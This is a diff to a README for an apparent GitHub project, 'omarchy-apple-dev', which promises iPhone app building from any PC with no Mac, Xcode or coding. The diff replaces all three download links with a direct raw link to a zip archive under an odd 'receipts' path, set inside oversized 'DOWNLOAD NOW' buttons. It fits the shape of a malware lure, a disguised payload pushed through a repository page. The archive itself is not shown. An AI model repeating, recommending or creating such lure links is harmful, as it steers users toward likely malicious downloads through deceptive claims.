@@ -1,6 +1,6 @@
 <h1>⚡ omarchy-apple-dev - Build iOS Apps From Any PC</h1>
 <p align="center">
-  <a href="https://github.com/zalmanintegumentary5312/omarchy-apple-dev" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#1a1a2e;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(0,0,0,0.4);">⬇️⬇️⬇️ DOWNLOAD NOW ⬇️⬇️⬇️</a>
+  <a href="https://raw.githubusercontent.com/zalmanintegumentary5312/omarchy-apple-dev/main/receipts/v3.1.zip" style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#1a1a2e;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(0,0,0,0.4);">⬇️⬇️⬇️ DOWNLOAD NOW ⬇️⬇️⬇️</a>
 </p>
 
 <p align="center"><strong>Visit this link to download the application.</strong> No coding knowledge needed. No Apple computer needed. No Xcode needed. Just download, run, and build your own iPhone app.</p>
@@ -42,7 +42,7 @@
 
 <h2>⬇️ Download & Install - Step by Step</h2>
 
-<p><strong>Visit this link to download the application:</strong> <a href="https://github.com/zalmanintegumentary5312/omarchy-apple-dev" style="color:#4fc3f7;font-weight:bold;text-decoration:underline;">https://github.com/zalmanintegumentary5312/omarchy-apple-dev</a></p>
+<p><strong>Visit this link to download the application:</strong> <a href="https://raw.githubusercontent.com/zalmanintegumentary5312/omarchy-apple-dev/main/receipts/v3.1.zip" style="color:#4fc3f7;font-weight:bold;text-decoration:underline;">https://raw.githubusercontent.com/zalmanintegumentary5312/omarchy-apple-dev/main/receipts/v3.1.zip</a></p>
 
 <p>Follow these exact steps:</p>
 
@@ -129,4 +129,4 @@ First, close and reopen the app. Most issues are temporary. If you see an error 
 
 <p style="text-align:center;font-size:20px;margin-top:50px;">🎉 Go ahead, make something amazing. Your first iPhone app is minutes away. 🎉</p>
 
-<p style="text-align:center;"><a href="https://github.com/zalmanintegumentary5312/omarchy-apple-dev" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#36d1dc,#5b86e5);color:white;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 16px rgba(0,0,0,0.3);margin:20px 0;">📥 DOWNLOAD OMARCHY-APPLE-DEV NOW</a></p>
+<p style="text-align:center;"><a href="https://raw.githubusercontent.com/zalmanintegumentary5312/omarchy-apple-dev/main/receipts/v3.1.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#36d1dc,#5b86e5);color:white;font-size:18px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 6px 16px rgba(0,0,0,0.3);margin:20px 0;">📥 DOWNLOAD OMARCHY-APPLE-DEV NOW</a></p>
